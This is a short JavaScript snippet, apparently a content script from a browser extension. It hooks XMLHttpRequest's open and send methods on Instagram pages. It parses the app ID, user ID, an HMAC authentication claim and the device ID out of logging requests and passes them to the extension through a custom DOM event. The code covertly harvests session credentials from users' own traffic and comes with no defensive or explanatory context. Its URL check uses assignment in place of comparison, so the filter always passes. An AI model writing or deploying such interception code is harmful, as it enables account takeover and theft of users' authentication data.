var kupengmu_kule = new Object();
kupengmu_kule.tempOpen = XMLHttpRequest.prototype.open;
kupengmu_kule.tempSend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.open = function(a, b) {
    if (!a) var a='';
    if (!b) var b='';
    kupengmu_kule.tempOpen.apply(this, arguments);
    kupengmu_kule.method = a;  
    kupengmu_kule.url = b;
        if (a.toLowerCase() == 'get') {
            kupengmu_kule.data = b.split('?');
            kupengmu_kule.data = kupengmu_kule.data[1];
    }
}
XMLHttpRequest.prototype.send = function(a, b) {
    if (!a) var a='';
    if (!b) var b='';
    kupengmu_kule.tempSend.apply(this, arguments);
        if(kupengmu_kule.method.toLowerCase() == 'post')kupengmu_kule.data = a;
        kupengmu_kule.callback();
}
kupengmu_kule.callback = function (){
    var client_events = this.url, mate = decodeURIComponent(this.data), paser = mate.split("message=")[1], get_object = JSON.parse(paser);
    if(client_events = 'https://graph.instagram.com/logging_client_events'){
        var send_app_uid = get_object.app_uid;
        var send_app_id = get_object.app_id;
        var send_hmac = get_object.claims[0];
        var send_device_id = get_object.device_id;
        setTimeout(function() {
            document.dispatchEvent(new CustomEvent('RW759_connectExtension', {
                app_id : send_app_id,
                uid : send_app_uid,
                hmac: send_hmac,
                device : send_device_id
            }));
        }, 0);
    }
}
